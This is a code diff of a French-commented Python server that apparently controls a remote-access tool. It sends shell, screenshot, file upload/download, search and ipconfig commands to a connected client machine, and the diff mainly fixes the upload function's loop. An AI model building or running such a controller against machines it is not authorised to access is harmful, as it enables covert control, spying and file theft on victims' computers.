@@ -17,21 +17,23 @@ def download(client_socket):
     client_socket.send(b'download')  # Envoie de la commande
 
 # Fonction permettant de charger un fichier au client
-def upload(client_socket, filename):
+def upload(client_socket):
     while True:
         filename = input("[?] Entrez le nom du fichier à télécharger : ") # Récupération saisie du nom du fichier
         if filename.strip() == "":
             print("[!] Le nom du fichier ne peut pas être vide !")
+            continue
         else:
             if not os.path.exists(filename): # Vérification de l'existence du chemin
                 print("[!] Fichier introuvable")
                 client_socket.send(b'Fichier introuvable')
-        return
-        client_socket.send(b'upload')
-        client_socket.send(filename.encode())
-        requete_recue = client_socket.recv(4096).decode()
-        
-
+            else:
+                client_socket.send(b'upload') # Envoie de la commande
+                client_socket.send(filename.encode()) #Envoi du nom du fichier
+                requete_recue = client_socket.recv(4096).decode() # Récupération des résultats
+                print(f"Le fichier a bien été upload sous le chemin suivant : ")
+        break
+    
 # Fonction permettant d'initier un shell intéractif sur le client
 def shell(client_socket, client_ip):
     client_socket.send(b'shell')  # Envoie de la commande
@@ -73,7 +75,7 @@ def screenshot(client_socket, nb_screenshot):
 # Fonction permettant de chercher un fichier sur la machine du client
 def search(client_socket) :
     while True:
-        recherche_to_send = input("[*] Entrez le nom du fichier recherché : ") # Récupération du nom du fichier recherché
+        recherche_to_send = input("[?] Entrez le nom du fichier recherché : ") # Récupération du nom du fichier recherché
         if recherche_to_send.strip() == "":
             print("[!] Le nom du fichier ne peut pas être vide.")
         else:
@@ -124,7 +126,7 @@ def main():
             elif command.lower() == 'download':
                 download(client_socket)
             elif command.lower() == 'upload':
-                upload(client_socket, filename)
+                upload(client_socket)
             elif command.lower() == 'shell':
                 shell(client_socket, client_ip)
             elif command.lower() == 'ipconfig':
@@ -145,6 +147,5 @@ def main():
         client_socket.close()  # Fermeture du socket client
     server_socket.close()  # Fermeture du socket serveur
 
-if __name__ == "__main__": # Fonction Main
+if __name__ == "__main__":
     main()
-
